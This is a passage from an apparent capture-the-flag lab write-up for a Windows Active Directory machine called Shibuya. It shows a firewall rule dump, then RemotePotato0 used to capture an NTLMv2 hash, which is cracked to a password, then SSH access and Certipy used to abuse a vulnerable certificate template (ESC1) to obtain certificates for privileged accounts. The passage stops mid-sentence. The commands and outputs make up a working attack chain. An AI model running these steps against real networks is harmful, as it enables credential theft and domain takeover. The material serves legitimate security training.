class="gp">&gt;&gt;</span><span class="w"> </span><span class="nv">$collect</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">@()</span><span class="w"> </span><span class="gp">&gt;&gt;</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="kr">else</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="gp">&gt;&gt;</span><span class="w"> </span><span class="nv">$collect</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="bp">$_</span><span class="w"> </span><span class="gp">&gt;&gt;</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="gp">&gt;&gt;</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="go">Rule Name: Custom TCP Allow ---------------------------------------------------------------------- Enabled: Yes Direction: In Profiles: Domain,Private,Public Grouping: LocalIP: Any RemoteIP: Any Protocol: TCP LocalPort: 8000-9000 RemotePort: Any Edge traversal: No Action: Allow Rule Name: OpenSSH SSH Server (sshd) ---------------------------------------------------------------------- Enabled: Yes Direction: In Profiles: Domain,Private,Public Grouping: OpenSSH Server LocalIP: Any RemoteIP: Any Protocol: TCP LocalPort: 22 RemotePort: Any Edge traversal: No Action: Allow Rule Name: Certification Authority Enrollment and Management Protocol (CERTSVC-RPC-EPMAP-IN) ---------------------------------------------------------------------- Enabled: Yes Direction: In Profiles: Domain,Private,Public Grouping: Certification Authority LocalIP: Any RemoteIP: Any Protocol: TCP LocalPort: RPC-EPMap RemotePort: Any Edge traversal: No Action: Allow Rule Name: Certification Authority Enrollment and Management Protocol (CERTSVC-RPC-NP-IN) ---------------------------------------------------------------------- Enabled: Yes Direction: In Profiles: Domain,Private,Public Grouping: Certification Authority LocalIP: Any RemoteIP: Any Protocol: TCP LocalPort: 445 RemotePort: Any Edge traversal: No Action: Allow Rule Name: Certification Authority Enrollment and Management Protocol (CERTSVC-DCOM-IN) ---------------------------------------------------------------------- Enabled: Yes Direction: In Profiles: Domain,Private,Public Grouping: Certification Authority LocalIP: Any RemoteIP: Any Protocol: TCP LocalPort: 135 RemotePort: Any Edge traversal: No Action: Allow Rule Name: Certification Authority Enrollment and Management Protocol (CERTSVC-RPC-TCP-IN) ---------------------------------------------------------------------- Enabled: Yes Direction: In Profiles: Domain,Private,Public Grouping: Certification Authority LocalIP: Any RemoteIP: Any Protocol: TCP LocalPort: RPC RemotePort: Any Edge traversal: No Action: Allow Rule Name: File Server Remote Management (SMB-In) ---------------------------------------------------------------------- Enabled: Yes Direction: In Profiles: Domain,Private,Public Grouping: File Server Remote Management LocalIP: Any RemoteIP: Any Protocol: TCP LocalPort: 445 RemotePort: Any Edge traversal: No Action: Allow Rule Name: File Server Remote Management (WMI-In) ---------------------------------------------------------------------- Enabled: Yes Direction: In Profiles: Domain,Private,Public Grouping: File Server Remote Management LocalIP: Any RemoteIP: Any Protocol: TCP LocalPort: RPC RemotePort: Any Edge traversal: No Action: Allow Rule Name: File Server Remote Management (DCOM-In) ---------------------------------------------------------------------- Enabled: Yes Direction: In Profiles: Domain,Private,Public Grouping: File Server Remote Management LocalIP: Any RemoteIP: Any Protocol: TCP LocalPort: 135 RemotePort: Any Edge traversal: No Action: Allow Rule Name: RPC Endpoint Mapper (TCP, Incoming) ---------------------------------------------------------------------- Enabled: Yes Direction: In Profiles: Domain,Private,Public Grouping: DNS Service LocalIP: Any RemoteIP: Any Protocol: TCP LocalPort: RPC-EPMap RemotePort: Any Edge traversal: No Action: Allow Rule Name: DNS (TCP, Incoming) ---------------------------------------------------------------------- Enabled: Yes Direction: In Profiles: Domain,Private,Public Grouping: DNS Service LocalIP: Any RemoteIP: Any Protocol: TCP LocalPort: 53 RemotePort: Any Edge traversal: No Action: Allow Rule Name: RPC (TCP, Incoming) ---------------------------------------------------------------------- Enabled: Yes Direction: In Profiles: Domain,Private,Public Grouping: DNS Service LocalIP: Any RemoteIP: Any Protocol: TCP LocalPort: RPC RemotePort: Any Edge traversal: No Action: Allow Rule Name: Microsoft Key Distribution Service (RPC EPMAP) ---------------------------------------------------------------------- Enabled: Yes Direction: In Profiles: Domain,Private,Public Grouping: Microsoft Key Distribution Service (RPC EPMAP) LocalIP: Any RemoteIP: Any Protocol: TCP LocalPort: RPC-EPMap RemotePort: Any Edge traversal: No Action: Allow Rule Name: Active Directory Domain Controller - Secure LDAP (TCP-In) ---------------------------------------------------------------------- Enabled: Yes Direction: In Profiles: Domain,Private,Public Grouping: Active Directory Domain Services LocalIP: Any RemoteIP: Any Protocol: TCP LocalPort: 636 RemotePort: Any Edge traversal: No Action: Allow Rule Name: Active Directory Domain Controller (RPC-EPMAP) ---------------------------------------------------------------------- Enabled: Yes Direction: In Profiles: Domain,Private,Public Grouping: Active Directory Domain Services LocalIP: Any RemoteIP: Any Protocol: TCP LocalPort: RPC-EPMap RemotePort: Any Edge traversal: No Action: Allow Rule Name: Active Directory Domain Controller - Secure LDAP for Global Catalog (TCP-In) ---------------------------------------------------------------------- Enabled: Yes Direction: In Profiles: Domain,Private,Public Grouping: Active Directory Domain Services LocalIP: Any RemoteIP: Any Protocol: TCP LocalPort: 3269 RemotePort: Any Edge traversal: No Action: Allow Rule Name: Active Directory Domain Controller - LDAP for Global Catalog (TCP-In) ---------------------------------------------------------------------- Enabled: Yes Direction: In Profiles: Domain,Private,Public Grouping: Active Directory Domain Services LocalIP: Any RemoteIP: Any Protocol: TCP LocalPort: 3268 RemotePort: Any Edge traversal: No Action: Allow Rule Name: Active Directory Domain Controller - LDAP (TCP-In) ---------------------------------------------------------------------- Enabled: Yes Direction: In Profiles: Domain,Private,Public Grouping: Active Directory Domain Services LocalIP: Any RemoteIP: Any Protocol: TCP LocalPort: 389 RemotePort: Any Edge traversal: No Action: Allow Rule Name: Active Directory Domain Controller (RPC) ---------------------------------------------------------------------- Enabled: Yes Direction: In Profiles: Domain,Private,Public Grouping: Active Directory Domain Services LocalIP: Any RemoteIP: Any Protocol: TCP LocalPort: RPC RemotePort: Any Edge traversal: No Action: Allow Rule Name: File Replication (RPC) ---------------------------------------------------------------------- Enabled: Yes Direction: In Profiles: Domain,Private,Public Grouping: File Replication LocalIP: Any RemoteIP: Any Protocol: TCP LocalPort: RPC RemotePort: Any Edge traversal: No Action: Allow Rule Name: DFS Replication (RPC-In) ---------------------------------------------------------------------- Enabled: Yes Direction: In Profiles: Domain,Private,Public Grouping: DFS Replication LocalIP: Any RemoteIP: Any Protocol: TCP LocalPort: RPC RemotePort: Any Edge traversal: No Action: Allow Rule Name: Active Directory Domain Controller - SAM/LSA (NP-TCP-In) ---------------------------------------------------------------------- Enabled: Yes Direction: In Profiles: Domain,Private,Public Grouping: Active Directory Domain Services LocalIP: Any RemoteIP: Any Protocol: TCP LocalPort: 445 RemotePort: Any Edge traversal: No Action: Allow Rule Name: File Replication (RPC-EPMAP) ---------------------------------------------------------------------- Enabled: Yes Direction: In Profiles: Domain,Private,Public Grouping: File Replication LocalIP: Any RemoteIP: Any Protocol: TCP LocalPort: RPC-EPMap RemotePort: Any Edge traversal: No Action: Allow Rule Name: DFS Replication (RPC-EPMAP) ---------------------------------------------------------------------- Enabled: Yes Direction: In Profiles: Domain,Private,Public Grouping: DFS Replication LocalIP: Any RemoteIP: Any Protocol: TCP LocalPort: RPC-EPMap RemotePort: Any Edge traversal: No Action: Allow Rule Name: DFS Management (WMI-In) ---------------------------------------------------------------------- Enabled: Yes Direction: In Profiles: Domain,Private,Public Grouping: DFS Management LocalIP: Any RemoteIP: Any Protocol: TCP LocalPort: RPC RemotePort: Any Edge traversal: No Action: Allow Rule Name: DFS Management (SMB-In) ---------------------------------------------------------------------- Enabled: Yes Direction: In Profiles: Domain,Private,Public Grouping: DFS Management LocalIP: Any RemoteIP: Any Protocol: TCP LocalPort: 445 RemotePort: Any Edge traversal: No Action: Allow Rule Name: Kerberos Key Distribution Center - PCR (TCP-In) ---------------------------------------------------------------------- Enabled: Yes Direction: In Profiles: Domain,Private,Public Grouping: Kerberos Key Distribution Center LocalIP: Any RemoteIP: Any Protocol: TCP LocalPort: 464 RemotePort: Any Edge traversal: No Action: Allow Rule Name: Active Directory Web Services (TCP-In) ---------------------------------------------------------------------- Enabled: Yes Direction: In Profiles: Domain,Private,Public Grouping: Active Directory Web Services LocalIP: Any RemoteIP: Any Protocol: TCP LocalPort: 9389 RemotePort: Any Edge traversal: No Action: Allow Rule Name: DFS Management (DCOM-In) ---------------------------------------------------------------------- Enabled: Yes Direction: In Profiles: Domain,Private,Public Grouping: DFS Management LocalIP: Any RemoteIP: Any Protocol: TCP LocalPort: 135 RemotePort: Any Edge traversal: No Action: Allow Rule Name: DFS Management (TCP-In) ---------------------------------------------------------------------- Enabled: Yes Direction: In Profiles: Domain,Private,Public Grouping: DFS Management LocalIP: Any RemoteIP: Any Protocol: TCP LocalPort: RPC RemotePort: Any Edge traversal: No Action: Allow Rule Name: Microsoft Key Distribution Service (RPC) ---------------------------------------------------------------------- Enabled: Yes Direction: In Profiles: Domain,Private,Public Grouping: Microsoft Key Distribution Service (RPC) LocalIP: Any RemoteIP: Any Protocol: TCP LocalPort: RPC RemotePort: Any Edge traversal: No Action: Allow Rule Name: Kerberos Key Distribution Center (TCP-In) ---------------------------------------------------------------------- Enabled: Yes Direction: In Profiles: Domain,Private,Public Grouping: Kerberos Key Distribution Center LocalIP: Any RemoteIP: Any Protocol: TCP LocalPort: 88 RemotePort: Any Edge traversal: No Action: Allow Rule Name: Custom Block TCP ---------------------------------------------------------------------- Enabled: Yes Direction: In Profiles: Domain,Private,Public Grouping: LocalIP: Any RemoteIP: Any Protocol: TCP LocalPort: 389,636,5985 RemotePort: Any Edge traversal: No Action: Block Rule Name: Cast to Device streaming server (HTTP-Streaming-In) ---------------------------------------------------------------------- Enabled: Yes Direction: In Profiles: Domain Grouping: Cast to Device functionality LocalIP: Any RemoteIP: Any Protocol: TCP LocalPort: 10246 RemotePort: Any Edge traversal: No Action: Allow Rule Name: Remote Desktop - User Mode (TCP-In) ---------------------------------------------------------------------- Enabled: Yes Direction: In Profiles: Domain,Private,Public Grouping: Remote Desktop LocalIP: Any RemoteIP: Any Protocol: TCP LocalPort: 3389 RemotePort: Any Edge traversal: No Action: Allow Rule Name: AllJoyn Router (TCP-In) ---------------------------------------------------------------------- Enabled: Yes Direction: In Profiles: Domain,Private Grouping: AllJoyn Router LocalIP: Any RemoteIP: Any Protocol: TCP LocalPort: 9955 RemotePort: Any Edge traversal: No Action: Allow Rule Name: Core Networking - IPHTTPS (TCP-In) ---------------------------------------------------------------------- Enabled: Yes Direction: In Profiles: Domain,Private,Public Grouping: Core Networking LocalIP: Any RemoteIP: Any Protocol: TCP LocalPort: IPHTTPS RemotePort: Any Edge traversal: No Action: Allow Rule Name: File and Printer Sharing (SMB-In) ---------------------------------------------------------------------- Enabled: Yes Direction: In Profiles: Domain,Private,Public Grouping: File and Printer Sharing LocalIP: Any RemoteIP: Any Protocol: TCP LocalPort: 445 RemotePort: Any Edge traversal: No Action: Allow Rule Name: Remote Desktop - Shadow (TCP-In) ---------------------------------------------------------------------- Enabled: Yes Direction: In Profiles: Domain,Private,Public Grouping: Remote Desktop LocalIP: Any RemoteIP: Any Protocol: TCP LocalPort: Any RemotePort: Any Edge traversal: Defer to application Action: Allow Rule Name: File and Printer Sharing (NB-Session-In) ---------------------------------------------------------------------- Enabled: Yes Direction: In Profiles: Domain,Private,Public Grouping: File and Printer Sharing LocalIP: Any RemoteIP: Any Protocol: TCP LocalPort: 139 RemotePort: Any Edge traversal: No Action: Allow Rule Name: Microsoft Media Foundation Network Source IN [TCP 554] ---------------------------------------------------------------------- Enabled: Yes Direction: In Profiles: Domain,Private,Public Grouping: Microsoft Media Foundation Network Source LocalIP: Any RemoteIP: LocalSubnet Protocol: TCP LocalPort: 554,8554-8558 RemotePort: Any Edge traversal: No Action: Allow Rule Name: File and Printer Sharing (Spooler Service - RPC-EPMAP) ---------------------------------------------------------------------- Enabled: Yes Direction: In Profiles: Domain,Private,Public Grouping: File and Printer Sharing LocalIP: Any RemoteIP: Any Protocol: TCP LocalPort: RPC-EPMap RemotePort: Any Edge traversal: No Action: Allow Rule Name: DIAL protocol server (HTTP-In) ---------------------------------------------------------------------- Enabled: Yes Direction: In Profiles: Domain Grouping: DIAL protocol server LocalIP: Any RemoteIP: Any Protocol: TCP LocalPort: 10247 RemotePort: Any Edge traversal: No Action: Allow Rule Name: Windows Management Instrumentation (DCOM-In) ---------------------------------------------------------------------- Enabled: Yes Direction: In Profiles: Domain,Private,Public Grouping: Windows Management Instrumentation (WMI) LocalIP: Any RemoteIP: Any Protocol: TCP LocalPort: 135 RemotePort: Any Edge traversal: No Action: Allow Rule Name: Delivery Optimization (TCP-In) ---------------------------------------------------------------------- Enabled: Yes Direction: In Profiles: Domain,Private,Public Grouping: Delivery Optimization LocalIP: Any RemoteIP: Any Protocol: TCP LocalPort: 7680 RemotePort: Any Edge traversal: Yes Action: Allow Rule Name: Windows Remote Management (HTTP-In) ---------------------------------------------------------------------- Enabled: Yes Direction: In Profiles: Domain,Private Grouping: Windows Remote Management LocalIP: Any RemoteIP: Any Protocol: TCP LocalPort: 5985 RemotePort: Any Edge traversal: No Action: Allow Rule Name: Windows Management Instrumentation (WMI-In) ---------------------------------------------------------------------- Enabled: Yes Direction: In Profiles: Domain,Private,Public Grouping: Windows Management Instrumentation (WMI) LocalIP: Any RemoteIP: Any Protocol: TCP LocalPort: Any RemotePort: Any Edge traversal: No Action: Allow Rule Name: Windows Management Instrumentation (ASync-In) ---------------------------------------------------------------------- Enabled: Yes Direction: In Profiles: Domain,Private,Public Grouping: Windows Management Instrumentation (WMI) LocalIP: Any RemoteIP: Any Protocol: TCP LocalPort: Any RemotePort: Any Edge traversal: No Action: Allow Rule Name: Cast to Device streaming server (RTSP-Streaming-In) ---------------------------------------------------------------------- Enabled: Yes Direction: In Profiles: Domain Grouping: Cast to Device functionality LocalIP: Any RemoteIP: Any Protocol: TCP LocalPort: 23554,23555,23556 RemotePort: Any Edge traversal: No Action: Allow Rule Name: File and Printer Sharing (Spooler Service - RPC) ---------------------------------------------------------------------- Enabled: Yes Direction: In Profiles: Domain,Private,Public Grouping: File and Printer Sharing LocalIP: Any RemoteIP: Any Protocol: TCP LocalPort: RPC RemotePort: Any Edge traversal: No Action: Allow </span></code></pre></div></div> <p>The first rule is named Custom TCP Allow, and allows 8000-9000 in.</p> <h4 id="remotepotato0-success">RemotePotato0 Success</h4> <p>I’ll pick a port in that range, 8888, and update the <code class="language-plaintext highlighter-rouge">socat</code> listener:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">sudo </span>socat <span class="nt">-v</span> TCP-LISTEN:135,fork,reuseaddr TCP:10.129.234.42:8888 </code></pre></div></div> <p>It’s still listening on 135, but now it’s forwarding that to 8888 on Shibuya. I’ll run <code class="language-plaintext highlighter-rouge">RemotePotato0.exe</code> with an addition argument setting the port to listen on to 8888:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">PS C:\ProgramData&gt;</span><span class="w"> </span><span class="o">.</span><span class="n">\RemotePotato0.exe</span><span class="w"> </span><span class="nt">-m</span><span class="w"> </span><span class="nx">2</span><span class="w"> </span><span class="nt">-s</span><span class="w"> </span><span class="nx">1</span><span class="w"> </span><span class="nt">-x</span><span class="w"> </span><span class="nx">10.10.14.79</span><span class="w"> </span><span class="nt">-p</span><span class="w"> </span><span class="nx">8888</span><span class="w"> </span><span class="go">[*] Detected a Windows Server version not compatible with JuicyPotato. RogueOxidResolver must be run remotely. Remember to forward tcp port 135 on (null) to your victim machine on port 8888 [*] Example Network redirector: sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP::8888 [*] Starting the RPC server to capture the credentials hash from the user authentication!! [*] RPC relay server listening on port 9997 ... [*] Spawning COM object in the session: 1 [*] Calling StandardGetInstanceFromIStorage with CLSID:{5167B42F-C111-47A1-ACC4-8EABE61B0B54} [*] Starting RogueOxidResolver RPC Server listening on port 8888 ... [*] IStoragetrigger written: 104 bytes [*] ServerAlive2 RPC Call [*] ResolveOxid2 RPC call [+] Received the relayed authentication on the RPC relay server on port 9997 [*] Connected to RPC Server 127.0.0.1 on port 8888 [+] User hash stolen! NTLMv2 Client : AWSJPDC0522 NTLMv2 Username : SHIBUYA\Nigel.Mills NTLMv2 Hash : Nigel.Mills::SHIBUYA:f52be56e934b2cc4:806247512fbce989410edfdc281d07bd:010100000000000092a22027acc3db0181cf5dba1be2dbae0000000002000e005300480049004200550059004100010016004100570053004a0050004400430030003500320032000400140073006800690062007500790061002e0076006c0003002c004100570053004a0050004400430030003500320032002e0073006800690062007500790061002e0076006c000500140073006800690062007500790061002e0076006c000700080092a22027acc3db01060004000600000008003000300000000000000001000000002000002e3417c6809a0b8d004aa8655a76c63b61f22c6a8a02f0555cb9c7f6f8a4079e0a00100000000000000000000000000000000000090000000000000000000000 </span></code></pre></div></div> <p>nigel.mills tries to authenticate to 135 on my host, which is forwarded back to 8888 on Shibuya, which coerces a NetNTLMv2 back to my host where it’s captured.</p> <h3 id="crack-password">Crack Password</h3> <p>I’ll pass that hash to <code class="language-plaintext highlighter-rouge">hashcat</code> with <code class="language-plaintext highlighter-rouge">rockyou.txt</code>:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">$ </span>hashcat nigel.mills.hash /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt <span class="go">hashcat (v6.2.6) starting in autodetect mode ...[snip]... Hash-mode was not specified with -m. Attempting to auto-detect hash mode. The following mode was auto-detected as the only one matching your input hash: 5600 | NetNTLMv2 | Network Protocol ...[snip]... NIGEL.MILLS::SHIBUYA:f52be56e934b2cc4:806247512fbce989410edfdc281d07bd:010100000000000092a22027acc3db0181cf5dba1be2dbae0000000002000e005300480049004200550059004100010016004100570053004a0050004400430030003500320032000400140073006800690062007500790061002e0076006c0003002c004100570053004a0050004400430030003500320032002e0073006800690062007500790061002e0076006c000500140073006800690062007500790061002e0076006c000700080092a22027acc3db01060004000600000008003000300000000000000001000000002000002e3417c6809a0b8d004aa8655a76c63b61f22c6a8a02f0555cb9c7f6f8a4079e0a00100000000000000000000000000000000000090000000000000000000000:Sail2Boat3 ...[snip]... </span></code></pre></div></div> <p>It cracks to “Sail2Boat3” very quickly.</p> <h3 id="ssh-1">SSH</h3> <p>I’ll use that password to get an SSH session as nigel.mills:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>sshpass <span class="nt">-p</span> <span class="s1">'Sail2Boat3'</span> ssh nigel.mills@shibuya.vl <span class="go">Microsoft Windows [Version 10.0.20348.3453] (c) Microsoft Corporation. All rights reserved. </span><span class="gp">shibuya\nigel.mills@AWSJPDC0522 C:\Users\nigel.mills&gt;</span><span class="w"> </span></code></pre></div></div> <p><em>Disclaimer - I like to use <code class="language-plaintext highlighter-rouge">sshpass</code> to pass passwords via the command line for CTF blog posts because it makes it very clear what I’m doing. Never enter real credentials into the command line like this.</em></p> <h2 id="shell-as-_admin">Shell as _admin</h2> <h3 id="enumeration">Enumeration</h3> <h4 id="filesystem">Filesystem</h4> <p>nigel.mills doesn’t really have access to anything additional interesting on the host. Their home directory is pretty empty:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">shibuya\nigel.mills@AWSJPDC0522 C:\Users\nigel.mills&gt;tree /f Folder PATH listing Volume serial number is 46FF-CF3D C:. ├───3D Objects ├───Contacts ├───Desktop │ AWSJPDC0522.rdp │ Microsoft Edge.lnk │ ├───Documents ├───Downloads ├───Favorites │ │ Bing.url │ │ │ └───Links ├───Links │ Desktop.lnk │ Downloads.lnk │ ├───Music ├───Pictures ├───Saved Games ├───Searches └───Videos </span></code></pre></div></div> <h4 id="bloodhound-1">Bloodhound</h4> <p>In addition to Domain Users, nigel.mills is also a member of the T1_Admins group, which provides enrollment privileges for the SHIBUYAWEB certificate:</p> <picture> <source type="image/webp" srcset="/img/image-20250513143112255.webp" /> <img loading="lazy" src="/img/image-20250513143112255.png" alt="image-20250513143112255" class="include_image " /> </picture> <p>Just looking at the properties of the certificate, it meets all <a href="https://www.crowe.com/cybersecurity-watch/exploiting-ad-cs-a-quick-look-at-esc1-esc8">the requirements</a> for ESC1:</p> <picture> <source type="image/webp" srcset="/img/image-20250513143524133.webp" /> <img loading="lazy" src="/img/image-20250513143524133.png" alt="image-20250513143524133" class="include_image " /> </picture> <h3 id="esc1">ESC1</h3> <h4 id="identify-as-vulnerable">Identify as Vulnerable</h4> <p>Even without noticing this certificate is vulnerable to ESC1, I can run <a href="https://github.com/ly4k/Certipy">Certipy</a> to check for vulnerabilities in the accessible certificates. <code class="language-plaintext highlighter-rouge">certipy</code> will need to connect to LDAP, so I’ll reconnect a SSH session with <code class="language-plaintext highlighter-rouge">-D 1080</code>, which gives a socks proxy over the SSH session listening on my host on TCP 1080.</p> <p>I’ll make sure my <code class="language-plaintext highlighter-rouge">/etc/proxychains.conf</code> file has 1080 as the only chain:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">tail</span> <span class="nt">-1</span> /etc/proxychains.conf <span class="go">socks5 127.0.0.1 1080 </span></code></pre></div></div> <p>I’ll use nigel.mills to query for vulnerable certificates over proxychains:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>proxychains certipy find <span class="nt">-vulnerable</span> <span class="nt">-u</span> nigel.mills <span class="nt">-p</span> Sail2Boat3 <span class="nt">-dc-ip</span> 127.0.0.1 <span class="nt">-stdout</span> <span class="go">ProxyChains-3.1 (http://proxychains.sf.net) Certipy v4.8.2 - by Oliver Lyak (ly4k) |S-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-127.0.0.1:636-&lt;&gt;&lt;&gt;-OK [*] Finding certificate templates [*] Found 34 certificate templates [*] Finding certificate authorities [*] Found 1 certificate authority [*] Found 12 enabled certificate templates [*] Trying to get CA configuration for 'shibuya-AWSJPDC0522-CA' via CSRA |S-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-10.129.234.42:135-&lt;&gt;&lt;&gt;-OK |S-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-10.129.234.42:62637-&lt;&gt;&lt;&gt;-OK [!] Got error while trying to get CA configuration for 'shibuya-AWSJPDC0522-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error. [*] Trying to get CA configuration for 'shibuya-AWSJPDC0522-CA' via RRP |S-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-10.129.234.42:445-&lt;&gt;&lt;&gt;-OK [*] Got CA configuration for 'shibuya-AWSJPDC0522-CA' |S-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-10.129.234.42:80-&lt;&gt;&lt;&gt;-OK [*] Enumeration output: Certificate Authorities 0 CA Name : shibuya-AWSJPDC0522-CA DNS Name : AWSJPDC0522.shibuya.vl Certificate Subject : CN=shibuya-AWSJPDC0522-CA, DC=shibuya, DC=vl Certificate Serial Number : 2417712CBD96C58449CFDA3BE3987F52 Certificate Validity Start : 2025-02-15 07:24:14+00:00 Certificate Validity End : 2125-02-15 07:34:13+00:00 Web Enrollment : Enabled User Specified SAN : Disabled Request Disposition : Issue Enforce Encryption for Requests : Enabled Permissions Owner : SHIBUYA.VL\Administrators Access Rights ManageCertificates : SHIBUYA.VL\Administrators SHIBUYA.VL\Domain Admins SHIBUYA.VL\Enterprise Admins ManageCa : SHIBUYA.VL\Administrators SHIBUYA.VL\Domain Admins SHIBUYA.VL\Enterprise Admins Enroll : SHIBUYA.VL\Authenticated Users [!] Vulnerabilities ESC8 : Web Enrollment is enabled and Request Disposition is set to Issue Certificate Templates 0 Template Name : ShibuyaWeb Display Name : ShibuyaWeb Certificate Authorities : shibuya-AWSJPDC0522-CA Enabled : True Client Authentication : True Enrollment Agent : True Any Purpose : True Enrollee Supplies Subject : True Certificate Name Flag : EnrolleeSuppliesSubject Enrollment Flag : None Private Key Flag : ExportableKey Extended Key Usage : Any Purpose Server Authentication Requires Manager Approval : False Requires Key Archival : False Authorized Signatures Required : 0 Validity Period : 100 years Renewal Period : 75 years Minimum RSA Key Length : 4096 Permissions Enrollment Permissions Enrollment Rights : SHIBUYA.VL\t1_admins SHIBUYA.VL\Domain Admins SHIBUYA.VL\Enterprise Admins Object Control Permissions Owner : SHIBUYA.VL\_admin Write Owner Principals : SHIBUYA.VL\Domain Admins SHIBUYA.VL\Enterprise Admins SHIBUYA.VL\_admin Write Dacl Principals : SHIBUYA.VL\Domain Admins SHIBUYA.VL\Enterprise Admins SHIBUYA.VL\_admin Write Property Principals : SHIBUYA.VL\Domain Admins SHIBUYA.VL\Enterprise Admins SHIBUYA.VL\_admin [!] Vulnerabilities ESC1 : 'SHIBUYA.VL\\t1_admins' can enroll, enrollee supplies subject and template allows client authentication ESC2 : 'SHIBUYA.VL\\t1_admins' can enroll and template can be used for any purpose ESC3 : 'SHIBUYA.VL\\t1_admins' can enroll and template has Certificate Request Agent EKU set </span></code></pre></div></div> <p>The CA is vulnerable to ESC8, and the certificate template is vulnerable to ESC1, ESC2, and ESC3.</p> <h4 id="exploit">Exploit</h4> <p>ESC1 is the simplest to exploit. I’m just going to request a certificate as administrator:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>proxychains certipy req <span class="nt">-u</span> nigel.mills <span class="nt">-p</span> Sail2Boat3 <span class="nt">-dc-ip</span> 127.0.0.1 <span class="nt">-ca</span> shibuya-AWSJPDC0522-CA <span class="nt">-template</span> ShibuyaWeb <span class="nt">-upn</span> administrator@shibuya.vl <span class="nt">-target</span> AWSJPDC0522.shibuya.vl <span class="go">ProxyChains-3.1 (http://proxychains.sf.net) Certipy v4.8.2 - by Oliver Lyak (ly4k) [*] Requesting certificate via RPC |S-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-10.129.234.42:445-&lt;&gt;&lt;&gt;-OK [-] Got error while trying to request certificate: code: 0x80094811 - CERTSRV_E_KEY_LENGTH - The public key does not meet the minimum size required by the specified certificate template. [*] Request ID is 4 Would you like to save the private key? (y/N) [-] Failed to request certificate </span></code></pre></div></div> <p>It fails, as the public key is not big enough. I’ll add <code class="language-plaintext highlighter-rouge">-key-size 4096</code> and it saves a certificate:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>proxychains certipy req <span class="nt">-u</span> nigel.mills <span class="nt">-p</span> Sail2Boat3 <span class="nt">-dc-ip</span> 127.0.0.1 <span class="nt">-ca</span> shibuya-AWSJPDC0522-CA <span class="nt">-template</span> ShibuyaWeb <span class="nt">-upn</span> administrator@shibuya.vl <span class="nt">-target</span> AWSJPDC0522.shibuya.vl <span class="nt">-key-size</span> 4096 <span class="go">ProxyChains-3.1 (http://proxychains.sf.net) Certipy v4.8.2 - by Oliver Lyak (ly4k) [*] Requesting certificate via RPC |S-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-10.129.234.42:445-&lt;&gt;&lt;&gt;-OK [*] Successfully requested certificate [*] Request ID is 7 [*] Got certificate with UPN 'administrator@shibuya.vl' [*] Certificate has no object SID [*] Saved certificate and private key to 'administrator.pfx' </span></code></pre></div></div> <p>If I try to use this certificate, it fails:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>proxychains certipy auth <span class="nt">-pfx</span> administrator.pfx <span class="nt">-dc-ip</span> 127.0.0.1 <span class="go">ProxyChains-3.1 (http://proxychains.sf.net) Certipy v4.8.2 - by Oliver Lyak (ly4k) [*] Using principal: administrator@shibuya.vl [*] Trying to get TGT... |S-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-127.0.0.1:88-&lt;&gt;&lt;&gt;-OK [-] Got error while trying to request TGT: Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database) </span></code></pre></div></div> <p>The administrator user isn’t in the Kerberos database. A quick look at BloodHound shows that the only member of the Domain Admins group is _admin:</p> <picture> <source type="image/webp" srcset="/img/image-20250513145247589.webp" /> <img loading="lazy" src="/img/image-20250513145247589.png" alt="image-20250513145247589" class="include_image " /> </picture> <p>I’ll update the target user principal name, and run again:</p> <div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>proxychains certipy req <span class="nt">-u</span> nigel.mills <span class="nt">-p</span> Sail2Boat3 <span class="nt">-dc-ip</span> 127.0.0.1 <span class="nt">-ca</span> shibuya-AWSJPDC0522-CA <span class="nt">-template</span> ShibuyaWeb <span class="nt">-upn</span> _admin@shibuya.vl <span class="nt">-target</span> AWSJPDC0522.shibuya.vl <span class="nt">-key-size</span> 4096 <span class="go">ProxyChains-3.1 (http://proxychains.sf.net) Certipy v4.8.2 - by Oliver Lyak (ly4k) [*] Requesting certificate via RPC |S-chain|-&lt;&gt;-127.0.0.1:1080-&lt;&gt;&lt;&gt;-10.129.234.42:445-&lt;&gt;&lt;&gt;-OK [*] Successfully requested certificate [*] Request ID is 9 [*] Got certificate with UPN '_admin@shibuya.vl' [*] Certificate has no object SID [*] Saved certificate and private key to '_admin.pfx' </span></code></pre></div></div> <p>Now the 